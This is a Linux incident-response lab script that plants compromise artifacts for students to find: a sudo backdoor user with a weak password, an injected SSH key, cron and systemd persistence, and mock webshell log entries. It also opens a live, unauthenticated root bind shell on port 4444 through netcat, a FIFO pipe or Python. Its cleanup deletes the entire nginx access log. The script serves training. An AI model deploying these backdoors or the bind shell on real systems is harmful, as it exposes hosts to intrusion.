#!/bin/bash
# ==============================================================================
# Linux Incident Response Lab Simulation Script
# ==============================================================================
# Simulates common Linux attacker actions (persistence, unauthorized users, 
# mock webshell logs, active listening backdoor, hidden scripts).
# Must be run with sudo/root privileges.
#
# Usage:
#   sudo ./linux_compromise_sim.sh simulate
#   sudo ./linux_compromise_sim.sh cleanup
# ==============================================================================

ACTION=${1:-simulate}

# Check for root privileges
if [ "$EUID" -ne 0 ]; then
  echo "[-] Please run this script with sudo or as root."
  exit 1
fi

# Define IOC (Indicators of Compromise) variables
BACKDOOR_PORT=4444
MOCK_LOG_PATH="/var/log/nginx/access.log"
MOCK_LOG_DIR="/var/log/nginx"
CRON_PATH="/etc/cron.d/sysmaintenance"
SHM_SCRIPT="/dev/shm/.sysupdate.sh"
SYSTEMD_SERVICE="/etc/systemd/system/sysmaintenance.service"
BACKDOOR_USER="support-agent"

# Detect default user's SSH path (excluding root)
REAL_USER=$(logname 2>/dev/null || echo $SUDO_USER)
if [ -z "$REAL_USER" ] || [ "$REAL_USER" = "root" ]; then
    # Fallback to first non-root user in home directory if run in weird environment
    REAL_USER=$(awk -F: '$3 >= 1000 && $3 != 65534 {print $1; exit}' /etc/passwd)
fi
USER_HOME=$(eval echo "~$REAL_USER")
SSH_AUTH_KEYS="$USER_HOME/.ssh/authorized_keys"
BACKDOOR_SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3a3yV2xN... simulated-attacker@c2-server"

start_simulation() {
    echo "[*] Starting Linux Incident Response Simulation..."

    # 1. Backdoor User Creation
    echo "[+] Creating backdoor user account: $BACKDOOR_USER"
    if ! id -u "$BACKDOOR_USER" >/dev/null 2>&1; then
        # Create user with a dummy password and login shell
        useradd -m -s /bin/bash "$BACKDOOR_USER" 2>/dev/null
        echo "$BACKDOOR_USER:P@ssword123!" | chpasswd 2>/dev/null
        # Add to sudo group (Ubuntu/Debian) or wheel (CentOS/RHEL)
        usermod -aG sudo "$BACKDOOR_USER" 2>/dev/null || usermod -aG wheel "$BACKDOOR_USER" 2>/dev/null
        echo "    [✓] Created user '$BACKDOOR_USER' with sudo access."
    else
        echo "    [!] User '$BACKDOOR_USER' already exists."
    fi

    # 2. SSH Backdoor Persistence (Authorized Keys)
    if [ -d "$USER_HOME/.ssh" ] || [ -f "$SSH_AUTH_KEYS" ]; then
        echo "[+] Adding attacker SSH public key to $REAL_USER's authorized_keys"
        # Ensure directory and file exist
        mkdir -p "$USER_HOME/.ssh"
        chmod 700 "$USER_HOME/.ssh"
        touch "$SSH_AUTH_KEYS"
        chmod 600 "$SSH_AUTH_KEYS"
        chown -R "$REAL_USER":"$REAL_USER" "$USER_HOME/.ssh"
        
        if ! grep -q "simulated-attacker" "$SSH_AUTH_KEYS"; then
            echo -e "\n# ATTACKER BACKDOOR KEY\n$BACKDOOR_SSH_KEY" >> "$SSH_AUTH_KEYS"
            echo "    [✓] SSH key added to $SSH_AUTH_KEYS"
        else
            echo "    [!] SSH key already present in $SSH_AUTH_KEYS"
        fi
    else
        echo "    [!] SSH directory not found for $REAL_USER. Skipping SSH key injection."
    fi

    # 3. Cron Job Persistence
    echo "[+] Creating persistence via Cron Job..."
    # Create hidden script in /dev/shm (shared memory)
    cat << 'EOF' > "$SHM_SCRIPT"
#!/bin/bash
# Simulated C2 Beaconing Script
logger -t "sysmaintenance" "Connecting to C2 beacon..."
# Sleep to simulate process duration
sleep 5
EOF
    chmod +x "$SHM_SCRIPT"
    chown root:root "$SHM_SCRIPT"

    # Add cron job file
    cat << EOF > "$CRON_PATH"
# Run every minute as root
* * * * * root $SHM_SCRIPT >/dev/null 2>&1
EOF
    chmod 644 "$CRON_PATH"
    echo "    [✓] Created script at $SHM_SCRIPT"
    echo "    [✓] Configured cron job at $CRON_PATH"

    # 4. Systemd Service Backdoor
    echo "[+] Installing fake systemd service..."
    cat << EOF > "$SYSTEMD_SERVICE"
[Unit]
Description=System Maintenance Service
After=network.target

[Service]
Type=simple
ExecStart=$SHM_SCRIPT
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    chmod 644 "$SYSTEMD_SERVICE"
    systemctl daemon-reload 2>/dev/null
    systemctl enable sysmaintenance.service 2>/dev/null
    systemctl start sysmaintenance.service 2>/dev/null
    echo "    [✓] Created and started systemd service: sysmaintenance.service"

    # 5. Active Listening Backdoor (netcat)
    echo "[+] Starting active backdoor listener on port $BACKDOOR_PORT..."
    # Kill any existing simulation listeners
    pkill -f "nc -lvnp $BACKDOOR_PORT" 2>/dev/null
    
    # Run netcat in background (using nohup/coproc to keep it alive)
    if command -v nc &> /dev/null; then
        nohup nc -l -k -p "$BACKDOOR_PORT" -e /bin/bash >/dev/null 2>&1 &
        # If -e is not supported (openbsd netcat), use a FIFO backdoor
        if [ $? -ne 0 ] || ! ps aux | grep -q "[n]c -l -k -p $BACKDOOR_PORT"; then
            rm -f /tmp/f
            mkfifo /tmp/f
            cat /tmp/f | /bin/bash -i 2>&1 | nc -l -k -p "$BACKDOOR_PORT" >/tmp/f &
        fi
        echo "    [✓] Netcat listener active on port $BACKDOOR_PORT"
    else
        # Fallback to python listener if nc is not present
        if command -v python3 &> /dev/null; then
            python3 -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(('0.0.0.0',$BACKDOOR_PORT)); s.listen(1); conn,addr=s.accept(); os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2); p=subprocess.call(['/bin/bash','-i']);" &
            echo "    [✓] Python backdoor listener active on port $BACKDOOR_PORT"
        else
            echo "    [!] Warning: Neither netcat nor Python3 found. Background listener could not start."
        fi
    fi

    # 6. Mock Web Logs (Webshell Indicators)
    echo "[+] Writing mock webshell indicators to web logs..."
    mkdir -p "$MOCK_LOG_DIR"
    cat << EOF >> "$MOCK_LOG_PATH"
192.168.1.45 - - [23/Jun/2026:14:32:10 +0000] "GET /index.php HTTP/1.1" 200 4522 "-" "Mozilla/5.0"
192.168.1.45 - - [23/Jun/2026:14:35:12 +0000] "POST /uploads/cmd.php HTTP/1.1" 200 128 "-" "Mozilla/5.0"
192.168.1.45 - - [23/Jun/2026:14:35:15 +0000] "POST /uploads/cmd.php?cmd=whoami HTTP/1.1" 200 15 "-" "Mozilla/5.0"
192.168.1.45 - - [23/Jun/2026:14:36:01 +0000] "POST /uploads/cmd.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 1482 "-" "Mozilla/5.0"
192.168.1.45 - - [23/Jun/2026:14:37:44 +0000] "POST /uploads/cmd.php?cmd=nc%20-lvnp%204444%20-e%20/bin/bash HTTP/1.1" 200 0 "-" "Mozilla/5.0"
EOF
    echo "    [✓] Wrote mock logs to $MOCK_LOG_PATH"

    echo ""
    echo "[✓] Simulation successfully deployed!"
    echo "Instruct students to search for:"
    echo "1. New unauthorized sudo user: '$BACKDOOR_USER'"
    echo "2. Attacker SSH public key in: $SSH_AUTH_KEYS"
    echo "3. Cron persistence at: $CRON_PATH running script $SHM_SCRIPT"
    echo "4. Persistent systemd service: sysmaintenance.service"
    echo "5. Active backdoor listening process on port $BACKDOOR_PORT"
    echo "6. Web attack traces in $MOCK_LOG_PATH"
}

stop_cleanup() {
    echo "[*] Cleaning up Linux Incident Response Simulation artifacts..."

    # 1. Remove Backdoor User
    if id -u "$BACKDOOR_USER" >/dev/null 2>&1; then
        userdel -r "$BACKDOOR_USER" 2>/dev/null
        echo "    [✓] Removed user '$BACKDOOR_USER' and home directory."
    else
        echo "    [!] User '$BACKDOOR_USER' not found."
    fi

    # 2. Remove SSH Backdoor Key
    if [ -f "$SSH_AUTH_KEYS" ]; then
        # Remove lines matching the signature
        sed -i '/# ATTACKER BACKDOOR KEY/d' "$SSH_AUTH_KEYS"
        sed -i "/$(echo "$BACKDOOR_SSH_KEY" | cut -d' ' -f3)/d" "$SSH_AUTH_KEYS"
        echo "    [✓] Removed attacker SSH public key from $SSH_AUTH_KEYS"
    fi

    # 3. Remove Cron Job
    if [ -f "$CRON_PATH" ]; then
        rm -f "$CRON_PATH"
        echo "    [✓] Removed cron job at $CRON_PATH"
    fi
    if [ -f "$SHM_SCRIPT" ]; then
        rm -f "$SHM_SCRIPT"
        echo "    [✓] Removed hidden update script at $SHM_SCRIPT"
    fi

    # 4. Remove Systemd Service
    if [ -f "$SYSTEMD_SERVICE" ]; then
        systemctl stop sysmaintenance.service 2>/dev/null
        systemctl disable sysmaintenance.service 2>/dev/null
        rm -f "$SYSTEMD_SERVICE"
        systemctl daemon-reload 2>/dev/null
        echo "    [✓] Stopped and removed systemd service: sysmaintenance.service"
    fi

    # 5. Terminate Backdoor Port Listeners
    echo "[-] Terminating active backdoor processes on port $BACKDOOR_PORT..."
    # Find processes using the port and kill them
    PID_LSOF=$(lsof -t -i :"$BACKDOOR_PORT" 2>/dev/null)
    PID_SS=$(ss -lptn "sport = :$BACKDOOR_PORT" 2>/dev/null | grep -o 'pid=[0-9]*' | cut -d= -f2)
    
    for pid in $PID_LSOF $PID_SS; do
        if [ -n "$pid" ]; then
            kill -9 "$pid" 2>/dev/null
            echo "    [✓] Killed process ID $pid listening on $BACKDOOR_PORT"
        fi
    done
    pkill -f "nc -l -k -p $BACKDOOR_PORT" 2>/dev/null
    pkill -f "python3 -c .*$BACKDOOR_PORT" 2>/dev/null
    rm -f /tmp/f

    # 6. Remove Mock Web Logs
    if [ -f "$MOCK_LOG_PATH" ]; then
        rm -f "$MOCK_LOG_PATH"
        echo "    [✓] Removed mock web logs at $MOCK_LOG_PATH"
    fi

    echo ""
    echo "[✓] Cleanup complete. System restored to original state!"
}

# Routing logic
case "$ACTION" in
    simulate)
        start_simulation
        ;;
    cleanup)
        stop_cleanup
        ;;
    *)
        echo "Usage: sudo $0 {simulate|cleanup}"
        exit 1
        ;;
esac
